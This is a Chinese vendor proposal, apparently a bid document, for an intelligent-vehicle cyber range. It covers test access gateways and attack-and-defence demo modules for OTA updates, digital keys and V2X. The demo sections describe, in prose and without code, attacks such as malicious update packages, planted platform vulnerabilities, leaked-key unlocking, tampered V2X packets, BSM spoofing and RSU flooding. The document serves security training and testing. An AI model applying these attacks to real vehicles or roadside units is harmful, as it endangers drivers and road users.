title="智能汽车网络靶场动态测试接入网关"></a>智能汽车网络靶场动态测试接入网关</h2><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：GLAgateway</p><p>数量：7套</p><p>指标参数信息如下：</p><ol><li>外观：支持安装7U的设备，具备拉杆与滚轮，便于移动；</li><li>提供KVM集成显示器及键盘鼠标；</li><li>内置上位机，Intel 4核i5 10代或更新处理器，内存8GB，存储250G SSD；</li><li>具备统一的电源管理模块；</li><li>支持仿真测试实验室HIL、VIL接入；</li><li>支持车身舒适、动力底盘、信息娱乐、网联通信、座舱、ADAS等HIL的接入；</li><li>提供HIL、VIL适配开发；</li><li>支持与HIL、VIL上位机软件进行通信，以发送测试控制信号与状态回读；</li><li>交互数据包含整车CAN数据、车载以太网数据、传感器模拟输入CAN信号、仿真场景天气道路数据、ECU仿真供电控制等；</li><li>提供接入网关与HIL、VIL交互协议模板；</li><li>支持对VIL系统的光照强度、雨量、雾量、交通标识等进行控制；</li><li>靶场接入控制设计需要不影响HIL、VIL正常测试工作。</li></ol><h3 id="方案-14"><a href="#方案-14" class="headerlink" title="方案"></a>方案</h3><p>动态测试接入模块选用7U空间的设备。外观应该采用坚固和可靠的结构，并使用耐用的材料制造。外观应该配备拉杆和滚轮，以方便移动。</p><p>动态测试接入模块实现多台计算机共享同一组显示器、键盘和鼠标设备。为了提供KVM集成显示器及键盘鼠标，集成显示器通常具有内置的KVM交换机功能，可以直接连接多台计算机，选择适用于KVM集成显示器的键盘和鼠标设备。</p><p>动态测试接入模块选择支持Intel 4核i5 10代或更新处理器的主板。确保主板支持8GB内存，并具备足够的插槽和支持频率，以满足系统对内存的需求。选择250GB的SSD存储器，以提供足够的存储空间和快速的数据读写速度。</p><p>动态测试接入模块具备统一的电源管理模块，并将电源分配给相关的硬件组件和外设设备。电源管理模块提供过流保护、过压保护、欠压保护功能，以防止电源异常对系统造成损害。</p><p>动态测试接入模块提供与HIL和VIL设备通信的硬件接口。提供相应的软件驱动程序和API（应用程序接口），以便与HIL和VIL设备进行通信和控制。</p><p>动态测试接入模块提供多种通信接口，以便与不同模块接入HIL设备。</p><p>动态测试接入模块具备HIL/VIL适配开发的能力，即与硬件回环测试平台进行集成。具备VIL适配开发的能力，即与车辆进行集成测试。具备兼容不同HIL和VIL测试平台的能力。</p><p>动态测试接入模块提供与HIL和VIL上位机软件进行通信的接口。在通信接口的基础上，还需要定义相应的通信协议,支持发送测试控制信号给HIL或VIL上位机软件。</p><p>动态测试接入模块整车CAN数据是指车辆各个部件之间通过CAN总线进行通信的数据。为了确保测试车辆的控制系统在各种场景下的响应能力，具备模拟各类传感器的输入信号能力，如整车CAN数据、车载以太网数据、传感器模拟输入CAN信号、仿真场景天气道路数据、ECU仿真供电控制等。</p><p>动态测试接入模块具备接入网关与HIL/VIL交互协议模板。</p><p>动态测试接入模块可调节的光源，可以模拟不同强度的光照条件。控制光源亮度；可以通过调整光源的亮度来控制光照强度。使用喷水系统可以模拟不同程度的雨量。使用雾机或喷雾器在测试场地或驾驶舱周围释放雾气，可以模拟不同浓度和厚度的雾量。使用可变交通标志，可以实现对交通标识的控制。通过与交通标志设备进行连接，并通过远程控制接口发送指令，可以实现对交通标志的控制。</p><p>动态测试接入模块靶场接入控制系统是独立于HIL和VIL系统的，它不应该直接干预或影响这两个测试系统的操作。接入控制系统应该与HIL和VIL系统分开部署，并且有一个独立的控制单元。</p><p>MOV11型移动接入网关是将车载无线通信网关、车载网络通信网关、调试桥网关整合集成到一起的便携式设备。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/71cdbf305c858243563cb1463a283ee2.png"></p><h2 id="车载无线通信网关"><a href="#车载无线通信网关" class="headerlink" title="车载无线通信网关"></a>车载无线通信网关</h2><ul><li>支持将实车无线接口接入本地或异地联邦靶场进行测试；支持从靶场对上位机访问权限控制至少桌面浏览、远程键盘输入、远程鼠标输入、复制拷贝文本、文件传输等权限配置；支持操作画面监控与录屏；支持上位机系统状态冻结与启动还原，冻结与还原配置需要访问控制；</li></ul><p><strong>靶场对上位机的访问权限控制通过VNC Server实现：</strong></p><p>VNC（Virtual Network Computing）是一种远程桌面协议，可以实现远程控制和访问计算机的图形界面。通过使用VNC，在一台计算机上远程控制另一台计算机，并进行桌面浏览、键盘输入、鼠标输入、文件拷贝、文件传输等操作。</p><p>在使用VNC时，权限控制可以通过以下方式进行配置：</p><p>VNC服务器设置密码：在VNC服务器上设置密码，只有知道密码的用户才能连接和控制该计算机。</p><p>VNC服务器访问控制：VNC服务器通常提供一些配置选项，可以限制特定IP地址或网络的访问。根据需要配置允许或拒绝的IP地址范围。</p><p>VNC服务器权限配置：某些VNC服务器软件提供更细粒度的权限配置选项，允许您为不同的用户或用户组设置不同的权限级别。这样，控制用户能够执行的操作，例如是否允许复制拷贝文本、文件传输等。</p><p><strong>上位机系统状态冻结与启动还原通过冰点还原实现；</strong></p><p>冰点还原是一种系统管理软件，可以实现系统状态的冻结和启动还原。它可以在计算机重启后恢复系统到事先设定的状态，从而保护系统免受恶意软件、配置更改或其他意外事件的影响。</p><p>使用冰点还原时，系统状态冻结和启动还原的工作流程如下：</p><p>冻结系统状态：在冰点还原软件中，选择将系统状态冻结为一个基准状态。在这个基准状态下，任何对系统的更改（例如安装软件、修改配置、添加文件等）都将被忽略。</p><p>系统运行时状态：在冻结状态下，自由地使用计算机并进行各种操作，例如安装软件、更改配置、存储文件等。这些更改只会在当前会话中生效，并不会对系统的基准状态产生影响。</p><p>启动还原：当您重启计算机时，冰点还原会将系统恢复到冻结状态下的基准状态。这意味着任何在冻结状态下进行的更改都会被清除，系统将回到冻结状态所代表的原始状态。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/c1020c0cb0d411a72503715a6ee7e82b.png"></p><p>（VNC权限控制界面）</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/9ddb7f429c8992c8c17e7f161ced39a7.png"></p><p>（冰点还原）</p><p>R4000车载无线通讯网关是一种实现车辆内部与外部无线通信的设备或系统。它支持多种无线通信技术，实现车辆与移动网络和车载设备之间的数据传输和互联网接入。车载无线通讯网关具有安全性、远程控制和管理等功能，为车辆提供了丰富的车联网应用和服务。</p><p>车载无线通讯网关适用于外场测试，便携可移动，支持2.4G和5G双频，支持802.11a/b/g/n/ac协议。</p><p>车载无线通讯网关配置2个适配器，配置2个适配器，且配置一根天线（选用5db全向天线），具备AP模式和STA模式。既支持低功率蓝牙，又支持标准蓝牙协议。具备接入实车无线电信号功能。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/8d39a23f8cd4530368852a217b7b4750.png"></p><h2 id="车载网络通信网关"><a href="#车载网络通信网关" class="headerlink" title="车载网络通信网关"></a>车载网络通信网关</h2><ul><li>支持将实车无线接口接入本地或异地联邦靶场进行测试；支持从靶场对上位机访问权限控制至少桌面浏览、远程键盘输入、远程鼠标输入、复制拷贝文本、文件传输等权限配置；支持操作画面监控与录屏；支持上位机系统状态冻结与启动还原，冻结与还原配置需要访问控制；</li></ul><p><strong>靶场对上位机的访问权限控制通过VNC Server实现：</strong></p><p>VNC（Virtual Network Computing）是一种远程桌面协议，可以实现远程控制和访问计算机的图形界面。通过使用VNC，在一台计算机上远程控制另一台计算机，并进行桌面浏览、键盘输入、鼠标输入、文件传输等操作。</p><p>在使用VNC时，权限控制可以通过以下方式进行配置：</p><p>VNC服务器设置密码：在VNC服务器上设置密码，只有知道密码的用户才能连接和控制该计算机。</p><p>VNC服务器访问控制：VNC服务器通常提供一些配置选项，可以限制特定IP地址或网络的访问。根据需要配置允许或拒绝的IP地址范围。</p><p>VNC服务器权限配置：某些VNC服务器软件提供更细粒度的权限配置选项，允许您为不同的用户或用户组设置不同的权限级别。这样，控制用户能够执行的操作，例如是否允许复制拷贝文本、文件传输等。</p><p><strong>上位机系统状态冻结与启动还原通过冰点还原实现；</strong></p><p>冰点还原是一种系统管理软件，可以实现系统状态的冻结和启动还原。它可以在计算机重启后恢复系统到事先设定的状态，从而保护系统免受恶意软件、配置更改或其他意外事件的影响。</p><p>使用冰点还原时，系统状态冻结和启动还原的工作流程如下：</p><p>冻结系统状态：在冰点还原软件中，选择将系统状态冻结为一个基准状态。在这个基准状态下，任何对系统的更改（例如安装软件、修改配置、添加文件等）都将被忽略。</p><p>系统运行时状态：在冻结状态下，自由地使用计算机并进行各种操作，例如安装软件、更改配置、存储文件等。这些更改只会在当前会话中生效，并不会对系统的基准状态产生影响。</p><p>启动还原：当您重启计算机时，冰点还原会将系统恢复到冻结状态下的基准状态。这意味着任何在冻结状态下进行的更改都会被清除，系统将回到冻结状态所代表的原始状态。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/c1020c0cb0d411a72503715a6ee7e82b.png"></p><p>（VNC权限控制界面）</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/9ddb7f429c8992c8c17e7f161ced39a7.png"></p><p>（冰点还原）</p><p>VBE车载网络通信网关是一种用于在车辆中实现网络通信的设备或系统。它充当车辆内部网络与外部网络之间的连接点，实现车辆与互联网的连接和数据传输；通过VNC及冰点还原实现从靶场对上位机访问权限控制，包含桌面浏览、远程键盘输入、远程鼠标输入、复制拷贝文本、文件传输等权限配置；同时支持操作画面监控与录屏；以及上位机系统状态冻结与启动还原，冻结与还原配置需要访问控制</p><p>网络通信：确保实车无线接口与本地或异地联邦靶场之间能够建立稳定、安全的网络连接。可以使用安全加密协议进行数据传输，采用防火墙和入侵检测系统等安全设备来保护通信链路。</p><p>访问权限控制：在靶场端设置权限控制机制，可以对上位机访问进行权限配置。包括桌面浏览权限、远程键盘输入权限、远程鼠标输入权限、复制拷贝文本权限、文件传输权限等。这样可以根据实际需要进行灵活的权限管理，确保只有经授权的人员才能进行相应的操作。</p><p>操作画面监控与录屏：在联邦靶场端设置监控和录屏功能，监控上位机的操作画面，并记录下相关操作过程。这样可以提供后续分析和回放，确保测试过程的可追溯性和安全性。</p><p>系统状态冻结与启动还原：设计针对上位机系统的状态冻结与启动还原功能，确保在进行测试前能够将系统状态冻结，以便后续还原测试环境。同时，对于这些冻结与还原配置，需要进行访问控制，确保只有授权人员才能进行相关操作。</p><p>车载设备的结构设计：车载网络通信设备需要具备轻量化、紧凑型的结构设计，以便于携带和安装。可以采用模块化设计，将主要功能模块集成在一个小型机箱内，便于携带和部署。</p><p>电源供应和电池管理：为了保证设备的移动性，需要考虑电源供应和电池管理。可以配置适量容量的可充电电池，并设计合理的能耗管理机制，以延长设备的使用时间。同时，可以预留外部电源接口，以便在需要时进行外部电源供应。</p><p>网络连接和无线技术支持：为了便于外场测试，设备需要支持多种网络连接方式，例如4G/5G移动网络、Wi-Fi等，以满足不同测试环境下的网络需求。此外，还需要支持不同的无线技术标准，以适应各种测试场景。</p><p>防护和抗干扰设计：外场测试环境通常存在各种不确定因素，例如恶劣天气、强烈干扰等。为了保护设备的正常运行和数据传输，可以在设备外壳上添加防水、防尘、抗震等保护措施，并采用抗干扰的设计方案，以减少外界干扰对设备性能的影响。</p><p>远程管理和监控：为了方便外场测试的管理和维护，可以考虑添加远程管理和监控功能。通过远程管理系统，可以实时查看设备状态、进行配置调整、收集测试数据等操作，以提高测试效率和便利性。</p><p>协议支持：首先，需要在车载网络通信设备中集成相应的硬件接口和软件功能，以支持LIN协议、CAN协议和CANFD扩展协议。这些协议可以通过相关的芯片或模块来实现，例如LIN控制器芯片、CAN控制器芯片等。</p><p>驱动程序和协议栈：为了使车载网络通信设备能够与接入的CAN节点进行通信，需要开发相应的驱动程序和协议栈。驱动程序负责与硬件接口进行通信，而协议栈则负责解析和封装LIN/CAN消息，并与靶场虚拟环境中的CAN节点进行数据交换。</p><p>接口适配和数据转换：由于车载网络通信设备与靶场虚拟环境中的CAN节点可能采用不同的物理接口和数据格式，因此需要进行接口适配和数据转换。可以通过使用适配器或转换器来处理不同接口之间的兼容性问题，并将数据进行格式转换，以确保通信的正确性和可靠性。</p><p>socketCAN支持：为实现车载网络通信设备与靶场虚拟环境中的CAN节点的通信，可以利用Linux操作系统的socketCAN机制。通过在车载网络通信设备上配置和使用socketCAN接口，将接入的CAN节点与靶场虚拟环境中的CAN节点进行连接和通信。</p><p>数据传输和协议解析：在通信过程中，车载网络通信设备需要实现数据的传输和协议的解析。可以通过socketCAN接口接收和发送CAN消息，并根据LIN/CAN协议规范进行解析和封装。同时，还需要实现相应的错误检测、纠错和流控等功能，以确保通信的可靠性和稳定性。</p><p>车载网络通信网关具备同时接入4路车载CAN或者LIN总线的能力。</p><p>车载网络通信网关支持1000M、100M车载以太网。</p><p>车载网络通信网关支持DoIP、SOME/IP协议。</p><p>车载网络通信网关具备同时接入4路车载以太网的能力。</p><h2 id="调试桥网关"><a href="#调试桥网关" class="headerlink" title="调试桥网关"></a>调试桥网关</h2><ul><li>支持将实车无线接口接入本地或异地联邦靶场进行测试；支持从靶场对上位机访问权限控制至少桌面浏览、远程键盘输入、远程鼠标输入、复制拷贝文本、文件传输等权限配置；支持操作画面监控与录屏；支持上位机系统状态冻结与启动还原，冻结与还原配置需要访问控制；</li></ul><p><strong>靶场对上位机的访问权限控制通过VNC Server实现：</strong></p><p>VNC（Virtual Network Computing）是一种远程桌面协议，可以实现远程控制和访问计算机的图形界面。通过使用VNC，在一台计算机上远程控制另一台计算机，并进行桌面浏览、键盘输入、鼠标输入、文件传输等操作。</p><p>在使用VNC时，权限控制可以通过以下方式进行配置：</p><p>VNC服务器设置密码：在VNC服务器上设置密码，只有知道密码的用户才能连接和控制该计算机。</p><p>VNC服务器访问控制：VNC服务器通常提供一些配置选项，可以限制特定IP地址或网络的访问。根据需要配置允许或拒绝的IP地址范围。</p><p>VNC服务器权限配置：某些VNC服务器软件提供更细粒度的权限配置选项，允许您为不同的用户或用户组设置不同的权限级别。这样，控制用户能够执行的操作，例如是否允许复制拷贝文本、文件传输等。</p><p><strong>上位机系统状态冻结与启动还原通过冰点还原实现；</strong></p><p>冰点还原是一种系统管理软件，可以实现系统状态的冻结和启动还原。它可以在计算机重启后恢复系统到事先设定的状态，从而保护系统免受恶意软件、配置更改或其他意外事件的影响。</p><p>使用冰点还原时，系统状态冻结和启动还原的工作流程如下：</p><p>冻结系统状态：在冰点还原软件中，选择将系统状态冻结为一个基准状态。在这个基准状态下，任何对系统的更改（例如安装软件、修改配置、添加文件等）都将被忽略。</p><p>系统运行时状态：在冻结状态下，自由地使用计算机并进行各种操作，例如安装软件、更改配置、存储文件等。这些更改只会在当前会话中生效，并不会对系统的基准状态产生影响。</p><p>启动还原：当您重启计算机时，冰点还原会将系统恢复到冻结状态下的基准状态。这意味着任何在冻结状态下进行的更改都会被清除，系统将回到冻结状态所代表的原始状态。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/c1020c0cb0d411a72503715a6ee7e82b.png"></p><p>（VNC权限控制界面）</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/9ddb7f429c8992c8c17e7f161ced39a7.png"></p><p>（冰点还原）</p><p>调试桥网关支持多种接口连接方式，包括有线以太网、无线局域网（Wi-Fi）、蜂窝网络（如4G、5G）等、USB接口、OBD诊断接口等。它可以将车辆内部的网络与外部网络进行连接，使车辆能够与互联网进行通信和数据交换。</p><p>调试桥网关使用于外场测试，便携可移动。</p><p>调试桥网关支持ADB/SSH协议。</p><p>调试桥网关配置2个USB3.0接口，2个UBS2.0接口及2个以太网调试接口。</p><h1 id="智能汽车网络靶场演示模块"><a href="#智能汽车网络靶场演示模块" class="headerlink" title="智能汽车网络靶场演示模块"></a>智能汽车网络靶场演示模块</h1><h2 id="智能汽车网络靶场演示"><a href="#智能汽车网络靶场演示" class="headerlink" title="智能汽车网络靶场演示"></a>智能汽车网络靶场演示</h2><h3 id="OTA远程升级攻防演示模块"><a href="#OTA远程升级攻防演示模块" class="headerlink" title="OTA远程升级攻防演示模块"></a>OTA远程升级攻防演示模块</h3><ul><li>平台支持升级策略管理。通过升级策略限定每次升级的范围（如：单辆车、小批量、所有车辆等）达到灰度升级的目的，需提供产品功能截图证明。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/421021b73aff0a900514f2bd2518bee8.png" alt="1703409936461"></p><p>为验证及测试OTA升级管理的安全性，需要为XXXX汽车网络靶场项目搭建一套OTA远程升级攻防演示平台，该平台具备OTA远程升级所需，可用于管理和执行远程设备升级的系统，该平台提供了一个集中化的管理界面，用于上传软件包、创建升级任务、监控升级过程和管理设备。</p><p>演示步骤：</p><p>1.首先在本地搭建OTA升级的管理平台和相关软件，负责存储软件包和管理升级过程，OTA管理平台提供管理界面，用于上传软件包、创建升级任务、监控升级进度等功能。</p><p>2.软件包管理：在OTA管理平台上，准备要升级的软件包。这些软件包是经过打包和签名的固件或应用程序版本。</p><p>3.设备注册和身份验证：在OTA管理平台上，为目标设备创建唯一的标识符，并设置设备的注册和身份验证机制。这将确保只有经过授权的设备才能接收和执行升级任务。</p><p>4.升级任务创建：使用OTA管理平台，创建升级任务并指定目标设备。选择要升级的软件包版本，并设置升级计划和策略，如升级时间、优先级等。</p><p>5.升级过程监控：OTA管理平台将提供实时监控功能，用于跟踪升级任务的执行情况。查看目标设备的在线状态、升级进度和日志信息。</p><p>6.远程升级执行：一旦升级任务创建并启动，OTA管理平台将向目标设备发送升级通知。目标设备接收到通知后，会下载并安装升级软件包。在OTA管理平台上查看升级任务的执行情况和结果。</p><p>OTA远程升级攻防演示模块包含以下功能：</p><p>OTA远程升级攻防演示模块通过OTA功能，进行零部件管理和ECU分类管理，可以远程更新和管理汽车的ECU零件。OTA还可以用于诊断和故障排除。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/1e9ef83a95619fa9ecc701315ae96bf9.png"></p><p>（OTA在线升级管理平台-零部件管理）</p><p>OTA远程升级攻防演示模块通过车辆管理功能，车辆绑定车型，可以方便地查看和管理每辆车辆的信息。OTA平台还支持车型管理功能，允许将每个车型与相应的ECU信息进行关联。</p><p>OTA远程升级攻防演示模块在OTA平台上，每个软件包都有一个唯一的标识符或版本号，通过平台进行ECU软件版本管理。</p><p>OTA远程升级攻防演示模块在OTA平台上，可以上传包括MCU升级包、MPU升级包、配置文件等在内的各个部分软件。在生成升级文件之前，OTA平台还提供签名和加密的功能。OTA平台会生成一个经过打包、签名和加密的升级文件，该文件可以直接应用于目标ECU进行软件升级。</p><p>OTA远程升级攻防演示模块差分升级是一种将目标版本与基准版本进行比较，且仅传输两个版本之间的差异部分的升级方式。</p><p>OTA远程升级攻防演示模块灰度升级是指在软件或固件升级过程中，将升级的范围限制在一部分设备上进行测试和验证，而不是立即对所有设备进行全量升级。通过OTA平台的升级策略管理功能，灵活地设置升级的范围。升级策略管理根据设备的属性、地理位置、网络条件等因素进行细致的配置。</p><p>OTA远程升级攻防演示模块升级任务创建：通过OTA平台，可以创建升级任务。升级任务审核：系统会设置升级任务的审核流程，以确保升级任务的合规性和安全性。升级任务取消：如果在升级任务执行之前，需要取消该任务，OTA平台也提供了相应的功能升级.任务执行状态监控：通过OTA平台实时监控升级任务的执行状态。</p><p>OTA远程升级攻防演示模块OTA平台可以帮助用户存储、分析和处理车辆上传的升级日志信息。</p><p>OTA远程升级攻防演示模块通过对车辆总数、车辆活跃状态、车辆ECU软件版本情况、升级任务执行成功率等进行分析，平台可以帮助用户发现问题、改进策略，并提高升级系统的可靠性和效率。</p><p>OTA远程升级攻防演示模块具备多维度的用户、角色、权限管理功能，可以批量或单独为用户配置权限，可以查看操作记录。</p><p>OTA远程升级攻防演示模块TLS双向认证，以确保数据传输安全。</p><p>OTA远程升级攻防演示模块为了防止升级包篡改，从而导致车辆被刷入恶意升级包，提供对升级包进行完整性校验对缺少升级包进行校验。</p><p>OTA远程升级攻防演示模块具备车机屏幕因恶意升级包被控制功能。</p><p>OTA远程升级攻防演示模块具备显示光电效果功能，实现车辆与云平台正常升级数据与恶意升级包数据的显示。</p><p>OTA远程升级攻防演示模块具备OTA云平台存在提权漏洞功能。</p><p>OTA远程升级攻防演示模块具备云平台被夺取后往车辆下发无用升级包功能。</p><p>OTA远程升级攻防演示模块具备大量无用升级包导致车机频繁弹出升级信息无法正常使用功能。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f73a72b22df1d1fb29a4993660cbe3ce.png"></p><h3 id="数字钥匙攻防演示模块"><a href="#数字钥匙攻防演示模块" class="headerlink" title="数字钥匙攻防演示模块"></a>数字钥匙攻防演示模块</h3><ul><li>平台应支持钥匙管理，包含钥匙状态，发放、吊销、冻结、分享钥匙，需提供产品功能截图证明。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/fd0fa65cb37313c84068ce46f7cff82b.png" alt="1702980000587"></p><p>数字钥匙钥匙管理界面</p><p>为演示车辆数字钥匙的安全性，本方案将搭建一个专门用于测试的环境。下面是搭建测试环境的一般步骤：</p><p>1. 选择测试车辆：选择一辆用于测试的车辆（可以是一辆实际的车辆或者是一个模拟器），并确保它符合需要测试需求。</p><p>2. 搭建车辆通信网络：搭建一个用于车辆通信的网络环境（一个局域网或一个专门的测试网络），以模拟车辆与数字钥匙之间的通信。</p><p>3. 安装数字钥匙系统：根据需要测试的数字钥匙系统的要求，在测试车辆上安装相应的数字钥匙系统。确保数字钥匙系统与车辆的通信正常，并能够进行密钥交换和身份验证。</p><p>4. 创建测试数字钥匙：在测试环境中创建测试用的数字钥匙。为每个测试数字钥匙分配唯一的标识符，并设置相应的密钥和身份验证信息。</p><p>5. 进行安全性测试：根据需要安全测试计划，对数字钥匙系统进行安全性测试。包括身份验证绕过、密钥破解、通信窃听等方面的测试。确保测试过程中的数据和通信都受到适当的保护。</p><p>6. 分析测试结果：分析安全性测试的结果，评估数字钥匙系统的安全性。识别潜在的安全漏洞和风险，并提出改进建议。</p><p>数字钥匙攻防演示模块功能如下：</p><p>数字钥匙攻防演示模块通过车型管理功能，可以方便地查看和管理每辆车辆的信息，允许将每个车型与相应的ECU信息进行关联。</p><p>数字钥匙攻防演示模块通过车辆管理功能，可以方便地查看和管理每辆车辆的信息，允许将每个车型与相应的ECU信息进行关联。</p><p>数字钥匙攻防演示模块具备钥匙管理功能，能够实现钥匙状态，发放、吊销、冻结、分享钥匙。</p><p>数字钥匙攻防演示模块支持创建、编辑、删除和禁用用户账户，并具备用户信息管理功能；支持创建不同的角色，并将特定权限分配给每个角色；提供灵活的权限配置功能，允许管理员对不同角色或用户进行权限控制；支持批量为用户配置权限；记录用户的操作行为，包括登录、身份验证、访问权限、修改配置，提供查询和查看操作记录的功能。</p><p>认证管理：提供基于不同数字钥匙协议的认证服务。包括基于不同数字钥匙协议的身份认证。</p><p>钥匙管理：提供基于不同数字钥匙协议的钥匙全生命周期管理服务。实现不同数字钥匙协议的分享、吊销、停用、恢复等功能。</p><p>车辆控制：基于不同数字钥匙协议，实现RKE功能。</p><p>状态同步：基于不同数字钥匙协议，提供车辆状态移动终端查看功能。</p><p>定位计算：提供基于BLE的高精度定位计算能力。</p><p>密码模块：提供数字钥匙方案所需要的安全存储，密码算法（支持国密算法、国际通用密码算法）等功能。并为其他数字钥匙敏感信息提供安全存储功能。</p><p>蓝牙连接管理：提供不同数字钥匙协议所需的蓝牙配对绑定及连接功能。同时根据定位计算需求，对移动终端蓝牙模块进行配置。</p><p>数字钥匙攻防演示模块具有数字钥匙车端与移动端蓝牙明文通信功能，以免导致钥匙信息的泄露。</p><p>数字钥匙攻防演示模块具备攻击方通过被泄露的钥匙信息完成车辆解锁功能。</p><p>数字钥匙攻防演示模块支持攻击方与车辆的攻击数据光电效果显示的功能。</p><p>数字钥匙攻防演示模块具备数字钥匙云平台存在远程执行漏洞功能。</p><p>数字钥匙攻防演示模块可以远程对用户的钥匙进行吊销操作，将其禁用或删除。确保吊销钥匙的命令能够及时同步到相关的车辆系统中，以便确保车辆收到有关禁止解锁的指令。如果车辆接收到禁止解锁指令后，会禁止对应用户的钥匙进行解锁操作。</p><p>数字钥匙攻防演示模块能够通过光电效果显示攻击方与云平台攻击数据。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/c9b60a7220de6554e67a7dc748b8850f.png"></p><h3 id="V2X攻防演示模块"><a href="#V2X攻防演示模块" class="headerlink" title="V2X攻防演示模块"></a>V2X攻防演示模块</h3><p>该演示旨在展示车辆到车辆通信（V2V）和车辆到基础设施通信（V2I）中存在的安全漏洞，并演示如何进行攻击和防御。通过模拟实际的V2X场景，演示参与者将了解V2X系统的安全挑战，并学习如何保护这些系统免受潜在的攻击。</p><p>演示步骤：</p><p>演示环境搭建：使用一个基于沙盘的模拟环境来模拟V2X通信场景。该环境包括模拟车辆和基础设施，以及相关的通信设备和网络。</p><p>攻击示范：演示者将展示一系攻击场景，例如恶意车辆伪造、信息篡改、拒绝服务攻击等。演示者将详细说明攻击的原理和方法，并演示攻击如何影响V2X通信的安全性和可靠性。</p><p>防御示范：演示者将介绍一些常见的防御措施和安全策略，以保护V2X系统免受攻击。包括加密通信、身份验证、数据完整性检查等技术和方法。</p><p>演示互动：演示参与者将有机会参与演示，以加深对V2X攻防的理解。他们可以提出问题、提供解决方案，并参与模拟的攻击和防御过程</p><p>V2X攻防演示模块设计和实施遵循严格的安全标准和协议。这些安全措施包括身份验证、数据完整性验证、加密协议、短期证书和密钥管理等。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/85f969ec0670b6edeb438686d8b4331f.png"></p><p>V2X攻防演示模块首先，要配置OBU（攻击）上的数据捕获工具，以便捕获LTE-V2X网络消息并将其发送给与OBU连接的PC。这包括设置捕获的过滤条件和目标IP地址等。其次，确保PC和OBU之间建立了可靠的连接，以便将捕获到的LTE-V2X网络消息传输到PC上。PC上安装并打开Wireshark工具通过正确的网络接口（网卡）来捕获从OBU传输到PC的数据流量。在Wireshark中，设置适当的过滤条件，以仅显示LTE-V2X相关的数据包。在Wireshark上启动抓包，开始捕获从OBU传输到PC的LTE-V2X数据包，能够在Wireshark中实时查看和分析这些数据包。Wireshark可以提供多种展示选项，根据需要选择合适的方式进行数据展示。同时，可以将捕获到的数据保存为pcap文件。</p><p>V2X攻防演示模块攻击者获取到pcap文件，该文件记录了车辆之间的通信数据包。攻击者将每个数据包中的紧急车辆字段进行篡改，改变其数值为紧急车辆标书数值。攻击者通过WiFi网络将篡改后的数据包发送给目标OBU。攻击者在物理上接入到车辆的WiFi网络，并能够成功发送数据包。OBU接收到篡改后的数据包，并解析其中的LTE-V2X消息。由于消息中紧急车辆字段被篡改，OBU可能会误认为有紧急情况发生。OBU将篡改后的LTE-V2X消息广播到PC5网络中。</p><p>V2X攻防演示模块具有伪冒车辆权限攻击场景。</p><p>V2X攻防演示模块模拟伪冒车辆权限攻击（Vehicle Privilege Escalation Attack）场景，以便于研究和演示攻击过程及其对车辆系统的影响，并开发相应的防御措施。该系统将重点模拟攻击者如何通过漏洞或设计缺陷获取并提升车辆系统权限，进而控制车辆的关键功能。</p><p>V2X攻防演示模块具有虚构车辆攻击场景功能。</p><p>V2X攻防演示模块只有授权的人员才能访问配置工具并进行相关设置。在配置工具的用户界面上，有一个明确的开关或选项，用于打开或关闭OBU（攻击）的位置模拟功能。为了防止未经授权的人员利用OBU（攻击）进行恶意活动，配置工具采取必要的安全性和防护措施。在开启OBU（攻击）的位置模拟功能之前，进行充分的风险评估和测试。在开启OBU（攻击）的位置模拟功能之前，确保配置工具符合相关的法律和合规要求。</p><p>V2X攻防演示模块具有假冒道路流动车辆数据攻击场景功能。</p><p>V2X攻防演示模块攻击者伪造BSM消息时，发送虚假的车辆信息和数据给RSU。导致RSU错误地认为有更多或更少的车辆在道路上行驶，进而影响交通信号灯的控制、交通拥堵的评估以及交通事故的预警等功能。</p><p>V2X攻防演示模块拥塞式攻击旨在通过超过RSU处理能力的消息负载来消耗其资源，使其无法正常工作。攻击者使用特殊软件或脚本来伪造大量的BSM消息，并以非常高的频率将它们发送到RSU。由于RSU需要处理和解析每个收到的消息，当消息数量超过其可承受范围时，RSU可能会出现延迟、错误、丢失消息或系统崩溃等问题。</p><p>V2X攻防演示模块具备通过OBU（攻击）扰乱车车通信，从而导致演示小车碰撞的功能。</p><p>V2X攻防演示模块具备攻击RSU，从而使RSU发布错误交通信号灯信息，进而导致演示小车闯红灯的功能。</p><p>V2X攻防演示模块具备与网络安全沙盘之间的演示效果联动功能。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/57f487bc853705034802c4744bb9d7e6.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/57f487bc853705034802c4744bb9d7e6.png"></p><h3 id="自动驾驶演示模块"><a href="#自动驾驶演示模块" class="headerlink" 